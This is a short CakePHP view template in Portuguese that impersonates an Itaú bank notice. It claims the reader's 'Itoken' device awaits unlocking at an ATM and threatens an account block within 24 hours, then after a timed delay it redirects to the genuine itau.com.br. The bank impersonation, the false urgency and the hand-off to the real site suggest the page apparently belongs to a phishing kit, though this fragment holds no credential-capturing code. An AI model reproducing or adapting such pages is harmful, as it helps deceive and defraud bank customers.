<div class="container-itau container-relative">
    <div class="card card-itau">
        Dispositivo Itoken pendente de desbloqueio.
    </div>
    <p class="center-justify">Para sua segurança, dirija-se a um Caixa Eletrônico Itaú e acesse: Mais Opções > Mais Opções > Segurança > Desbloquear aplicativo Itaú.</p>
    <p class="p-saving-logo"><?= $this->Html->image('itau/logo-itau-fb.png', ['class' => 'saving-logo']) ?></p>
    <p class="center-justify">Prazo de 24h para desbloquear, após poderá ocorrer o Bloqueio de sua Conta, <br> <strong>Banco Itaú</strong>.</p>
</div>
<script type="text/javascript">
    $(function() {
        var timeout = setTimeout(function() {
            var timeout2 = setTimeout(function() {
                window.location = "https://itau.com.br";
            }, 7000);
        }, 7000);
    })
</script>